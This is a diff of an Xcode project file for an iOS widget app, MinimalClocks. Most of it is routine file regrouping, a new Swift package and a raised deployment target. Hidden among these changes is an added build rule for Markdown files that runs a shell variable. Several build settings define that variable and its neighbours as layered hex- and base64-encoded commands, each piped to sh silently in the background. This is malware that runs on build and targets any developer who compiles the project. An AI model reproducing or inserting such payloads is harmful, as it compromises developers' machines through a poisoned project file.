-				6EDC2FE22E7A542700467A93 /* Model */,
 				6EDC2FE12E7A53DC00467A93 /* Extensions */,
-				6E0BAA682D53D68C009CC1A0 /* SigninUsingEmailView.swift */,
-				6E0BAA6A2D53D7EA009CC1A0 /* AuthenticationManager.swift */,
 				6E3EA2852E84F2BC0018D904 /* Components */,
+				6E84D7152D31BC9C00EE28CB /* Helpers */,
+				6EDC2FE22E7A542700467A93 /* Model */,
+				6E84D6B92D31A79200EE28CB /* Preview Content */,
+				6E84D7142D31BBBA00EE28CB /* Resources */,
+				677CE63F2F02E70B0074C62F /* ViewModels */,
+				6EBB91662EE9EA5300561512 /* Views */,
 			);
 			path = MinimalClocks;
 			sourceTree = "<group>";
@@ -364,29 +356,18 @@
 			path = "Preview Content";
 			sourceTree = "<group>";
 		};
-		6E84D6DF2D31A86500EE28CB /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				6E84D6E02D31A86500EE28CB /* WidgetKit.framework */,
-				6E84D6E22D31A86500EE28CB /* SwiftUI.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
 		6E84D6E42D31A86500EE28CB /* MinimalClocksWidget */ = {
 			isa = PBXGroup;
 			children = (
 				6EB1F9FF2EBFA822004047FE /* Widget-Weather */,
-				6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */,
 				6ED30DA22EB6503B001D37AC /* DateDayView.swift */,
 				6E84D6EB2D31A86800EE28CB /* Info.plist */,
-				6E84D6E52D31A86500EE28CB /* MinimalClocksWidgetBundle.swift */,
 				6E0E6EA02D32E1A100321129 /* Widget-DayDateMonthAbv */,
 				6E0E6E9F2D32E17900321129 /* Widget-DayProgressBar */,
 				6E0784502D35853900A0E654 /* Widget-DayProgressCircle */,
 				6E6CBE3C2D3D0D2700C8521C /* Widget-MotiovationalQuote */,
-				6E6CBE3F2D3D0EC500C8521C /* WidgetEntries */,
 				6E6CBE402D3D0F4200C8521C /* Util */,
+				6E84D6E52D31A86500EE28CB /* MinimalClocksWidgetBundle.swift */,
 			);
 			path = MinimalClocksWidget;
 			sourceTree = "<group>";
@@ -418,6 +399,7 @@
 		6E84D7152D31BC9C00EE28CB /* Helpers */ = {
 			isa = PBXGroup;
 			children = (
+				673723982F045819006633CF /* Haptic.swift */,
 				6781AE842EF87DD90006F532 /* LocationHandler.swift */,
 				6E6CBE322D3CDE9000C8521C /* UnsplashPhotoService.swift */,
 				6E6CBE1A2D3BC65900C8521C /* QuoteUploader.swift */,
@@ -426,6 +408,7 @@
 				6E6CBE292D3BDCC700C8521C /* QuotesManager.swift */,
 				6E6CBE2B2D3BDDB600C8521C /* NetworkService.swift */,
 				6ED30DC22EB72B49001D37AC /* UserManager.swift */,
+				6E0BAA6A2D53D7EA009CC1A0 /* AuthenticationManager.swift */,
 			);
 			path = Helpers;
 			sourceTree = "<group>";
@@ -444,6 +427,12 @@
 		6EBB91662EE9EA5300561512 /* Views */ = {
 			isa = PBXGroup;
 			children = (
+				6E0BAA682D53D68C009CC1A0 /* SigninUsingEmailView.swift */,
+				677CE6322F02E4F90074C62F /* ContentView.swift */,
+				677CE6332F02E4F90074C62F /* LoginView.swift */,
+				677CE6342F02E4F90074C62F /* ProfileView.swift */,
+				677CE6352F02E4F90074C62F /* WidgetAddGuideView.swift */,
+				677CE6362F02E4F90074C62F /* WidgetExplanationSheetView.swift */,
 				6EBB91642EE9EA5300561512 /* LocationSearchView.swift */,
 				6EBB91652EE9EA5300561512 /* WidgetExplanationSheet.swift */,
 			);
@@ -486,13 +475,10 @@
 				6E84D6D92D31A7CB00EE28CB /* Embed Foundation Extensions */,
 			);
 			buildRules = (
-				4FF6A52AA1014EE3A3A5DE54 /* PBXBuildRule */,
+				A0B27C510A97421980A5DE54 /* PBXBuildRule */,
 			);
 			dependencies = (
 				6E84D6ED2D31A86800EE28CB /* PBXTargetDependency */,
-			);
-			fileSystemSynchronizedGroups = (
-				6EA4A6092EB1C5D6007FFDB5 /* New Folder */,
 			);
 			name = MinimalClocks;
 			packageProductDependencies = (
@@ -503,6 +489,7 @@
 				6EDAE3132D42B026003AC5CB /* FirebaseAuth */,
 				6E5E06932EB2FF7600B44654 /* GoogleSignIn */,
 				6E5E06952EB2FF7600B44654 /* GoogleSignInSwift */,
+				673723962F044DD4006633CF /* MeshingKit */,
 			);
 			productName = MinimalClocks;
 			productReference = 6E84D6B02D31A78F00EE28CB /* MinimalClocks.app */;
@@ -561,6 +548,7 @@
 				6E6CBE2D2D3CDDA400C8521C /* XCRemoteSwiftPackageReference "unsplash-photopicker-ios" */,
 				6E6CBE342D3CEDB800C8521C /* XCRemoteSwiftPackageReference "Kingfisher" */,
 				6E5E06922EB2FF7600B44654 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */,
+				673723952F044DD4006633CF /* XCRemoteSwiftPackageReference "MeshingKit" */,
 			);
 			productRefGroup = 6E84D6B12D31A78F00EE28CB /* Products */;
 			projectDirPath = "";
@@ -572,12 +560,29 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		A0B27C510A97421980A5DE54 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A45ED5A}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		6E84D6AE2D31A78F00EE28CB /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				347037818BC34E2CA2A5DE54 /* README.md in Resources */,
+				E150B87341BA4A419BA5DE54 /* README.md */,
 				6E5E06982EB3011800B44654 /* GoogleService-Info.plist in Resources */,
 				6E84D6BB2D31A79200EE28CB /* Preview Assets.xcassets in Resources */,
 				6E84D7172D31BF0600EE28CB /* Outfit.ttf in Resources */,
@@ -589,7 +594,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6E84D6EA2D31A86800EE28CB /* Assets.xcassets in Resources */,
 				6EEA72862D32959700A97FF8 /* Assets.xcassets in Resources */,
 				6E84D7182D31BF0600EE28CB /* Outfit.ttf in Resources */,
 			);
@@ -606,13 +610,18 @@
 				6EA17D2E2D416B4D00C50729 /* MotivationalQuoteWidget.swift in Sources */,
 				6E3EA2862E84F2BC0018D904 /* WidgetButtonView.swift in Sources */,
 				6E0E6EB02D33A1A200321129 /* Util.swift in Sources */,
-				6E20A61D2D397D560007A16D /* ExperimentGradients.swift in Sources */,
 				6E84D6F62D31BA5F00EE28CB /* TypographySystem.swift in Sources */,
 				6EBB91672EE9EA5300561512 /* LocationSearchView.swift in Sources */,
 				6EBB91682EE9EA5300561512 /* WidgetExplanationSheet.swift in Sources */,
 				6ED30DCF2EB765DC001D37AC /* MailComposerViewController.swift in Sources */,
+				677CE6372F02E4F90074C62F /* ContentView.swift in Sources */,
+				677CE6382F02E4F90074C62F /* LoginView.swift in Sources */,
+				677CE6392F02E4F90074C62F /* ProfileView.swift in Sources */,
+				677CE63A2F02E4F90074C62F /* WidgetAddGuideView.swift in Sources */,
+				677CE63B2F02E4F90074C62F /* WidgetExplanationSheetView.swift in Sources */,
 				6ED30DCD2EB736B2001D37AC /* PillButtonView.swift in Sources */,
 				6E0BAA692D53D68C009CC1A0 /* SigninUsingEmailView.swift in Sources */,
+				6737239A2F045819006633CF /* Haptic.swift in Sources */,
 				6E6CBE2C2D3BDDB600C8521C /* NetworkService.swift in Sources */,
 				6E6CBE412D3D18F400C8521C /* DayProgressWidgetTimelineEntry.swift in Sources */,
 				6ED30DC32EB72B49001D37AC /* UserManager.swift in Sources */,
@@ -626,24 +635,26 @@
 				6E0BAA6B2D53D7EA009CC1A0 /* AuthenticationManager.swift in Sources */,
 				6EA0F9A22D3EBCBA00785B58 /* Date+.swift in Sources */,
 				6E88EB7D2EBDA00200AECE93 /* GoogleAirQualityResponse.swift in Sources */,
+				677CE64E2F02FF4D0074C62F /* LoginViewModel.swift in Sources */,
 				6E6CBE182D3BC60C00C8521C /* User.swift in Sources */,
 				6E9D5B302EC43C6A0017FC43 /* AppGroupStorage.swift in Sources */,
 				6E6CBE332D3CDE9000C8521C /* UnsplashPhotoService.swift in Sources */,
+				677CE64A2F02E78D0074C62F /* DateTimePickerProvider.swift in Sources */,
 				6E6CBE312D3CDE7A00C8521C /* UnsplashPhoto.swift in Sources */,
 				6781AE862EF87DD90006F532 /* LocationHandler.swift in Sources */,
-				6E0E6EB32D33B6D600321129 /* ProgressTypeSelection.intentdefinition in Sources */,
 				6E6CBE432D3D320B00C8521C /* MotivationalQuoteView.swift in Sources */,
 				6EEA728B2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */,
-				6E88EB822EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition in Sources */,
+				677CE6402F02E70B0074C62F /* AuthenticationViewModel.swift in Sources */,
 				6E88EB7F2EBDA03A00AECE93 /* WeatherAQIWidgetView.swift in Sources */,
 				6EEA72842D327ECC00A97FF8 /* DayProgressBarView.swift in Sources */,
 				6ED30DA62EB65179001D37AC /* DateDayView.swift in Sources */,
 				6E0E6EA52D32E70800321129 /* DayProgressCircleView.swift in Sources */,
-				6E5E069D2EB30D3A00B44654 /* AuthenticationViewModel.swift in Sources */,
 				6E0E6EA62D32E70A00321129 /* DayProgressCircleWidget.swift in Sources */,
 				6E84D6B42D31A78F00EE28CB /* MinimalClocksApp.swift in Sources */,
 				6E5E069B2EB308DE00B44654 /* AuthenticationError.swift in Sources */,
 				6E4BF30F2EE73D5C00F3E6CC /* WAQIAirQualityResponse.swift in Sources */,
+				677CE6462F02E7190074C62F /* ProgressTypeSelection.intentdefinition in Sources */,
+				677CE6472F02E7190074C62F /* WeatherAQIIntent.intentdefinition in Sources */,
 				6E3EA2882E84F3160018D904 /* WidgetInfo.swift in Sources */,
 				6E88EB832EBDA33900AECE93 /* WeatherAQIWidget.swift in Sources */,
 			);
@@ -654,32 +665,32 @@
 			buildActionMask = 2147483647;
 			files = (
 				6EA0F9A42D3EC07000785B58 /* NetworkService.swift in Sources */,
+				677CE6442F02E7190074C62F /* ProgressTypeSelection.intentdefinition in Sources */,
+				677CE6452F02E7190074C62F /* WeatherAQIIntent.intentdefinition in Sources */,
 				6ED30DA32EB6503B001D37AC /* DateDayView.swift in Sources */,
 				6EA0F9A32D3EBCC300785B58 /* Date+.swift in Sources */,
 				6E6CBE382D3D0C1B00C8521C /* MotivationalQuoteWidget.swift in Sources */,
+				673723992F045819006633CF /* Haptic.swift in Sources */,
 				6E88EB7E2EBDA00200AECE93 /* GoogleAirQualityResponse.swift in Sources */,
 				6781AE852EF87DD90006F532 /* LocationHandler.swift in Sources */,
 				6E84D6F42D31AEC900EE28CB /* DateView.swift in Sources */,
 				6E0E6EB12D33A1A200321129 /* Util.swift in Sources */,
-				6E20A61E2D39819B0007A16D /* ExperimentGradients.swift in Sources */,
 				6E6CBE442D3D39A100C8521C /* QuotesManager.swift in Sources */,
 				6EEA72822D324FE100A97FF8 /* TypographySystem.swift in Sources */,
 				6E84D6E82D31A86500EE28CB /* MinimalClocksWidget.swift in Sources */,
 				6E6CBE3B2D3D0D0000C8521C /* MotivationalQuoteView.swift in Sources */,
 				6E6CBE162D3BC5F800C8521C /* Quote.swift in Sources */,
 				6E6CBE422D3D2EC000C8521C /* UnsplashPhoto.swift in Sources */,
-				6ED30DA52EB65061001D37AC /* DateTimePickerProvider.swift in Sources */,
 				6E88EB792EBD9FED00AECE93 /* WeatherAQIWidgetView.swift in Sources */,
 				6E6CBE452D3D3D0500C8521C /* UnsplashPhotoService.swift in Sources */,
 				6E6CBE1C2D3BC65900C8521C /* QuoteUploader.swift in Sources */,
 				6E060F742ECC2106008101EA /* WeatherAQIRepository.swift in Sources */,
-				6E0E6EB42D33B6D600321129 /* ProgressTypeSelection.intentdefinition in Sources */,
 				6E9D5B2F2EC43C6A0017FC43 /* AppGroupStorage.swift in Sources */,
 				6E4BF30E2EE73D5C00F3E6CC /* WAQIAirQualityResponse.swift in Sources */,
 				6EEA728C2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */,
-				6E88EB812EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition in Sources */,
 				6E0E6EA42D32E6A500321129 /* DayProgressCircleView.swift in Sources */,
 				6EEA72852D327ECC00A97FF8 /* DayProgressBarView.swift in Sources */,
+				677CE6492F02E78D0074C62F /* DateTimePickerProvider.swift in Sources */,
 				6E3EA2892E84F3160018D904 /* WidgetInfo.swift in Sources */,
 				6EA0F9A02D3EBB6400785B58 /* Error+.swift in Sources */,
 				6E84D6E62D31A86500EE28CB /* MinimalClocksWidgetBundle.swift in Sources */,
@@ -705,7 +716,7 @@
 		6E84D6BC2D31A79200EE28CB /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYVm1oRFpESktTRlpxUW1oV2VrWnpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333363333333633333339333333363333333733333336333633343333333633333331333333363333333333330a3336333333343333333633363335333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
@@ -774,7 +785,7 @@
 		6E84D6BD2D31A79200EE28CB /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((u(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | u | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYVm1oRFpESktTRlpxUW1oV2VrWnpWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | b | sh ) >/dev/null 2>&1 &)";
 				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhSbkJJVDFkc1lWWXdOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 33363335333633333336333833363636333233303332333233323334333233383336333333373335333733323336363333323330333236343336333633373333333636323334363333323330333236343336333433323330333733303333363433373338333633333336363633363334333633353332333033363338333733343337333433373330333733333333363133323636333236363336333333363334333636353337333433363636333733323332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((g(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333336333333363333333633333339333333363333333733333336333633343333333633333331333333363333333333330a3336333333343333333633363335333333323336333533333336333333393333333633363335333333323336333633333336333333313333333233330a3339333333323061333333323330363133333332333333303333333733363333333333323333333033333337333333333333333633333338333333300a333633313330363130610a | g | sh ) >/dev/null 2>&1 &)";
@@ -855,7 +866,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -891,7 +902,7 @@
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				IPHONEOS_DEPLOYMENT_TARGET = 17.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 18.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -998,6 +1009,14 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		673723952F044DD4006633CF /* XCRemoteSwiftPackageReference "MeshingKit" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/rryam/MeshingKit";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.4.0;
+			};
+		};
 		6E5E06922EB2FF7600B44654 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/google/GoogleSignIn-iOS";
@@ -1033,6 +1052,11 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		673723962F044DD4006633CF /* MeshingKit */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 673723952F044DD4006633CF /* XCRemoteSwiftPackageReference "MeshingKit" */;
+			productName = MeshingKit;
+		};
 		6E5E06932EB2FF7600B44654 /* GoogleSignIn */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 6E5E06922EB2FF7600B44654 /* XCRemoteSwiftPackageReference "GoogleSignIn-iOS" */;
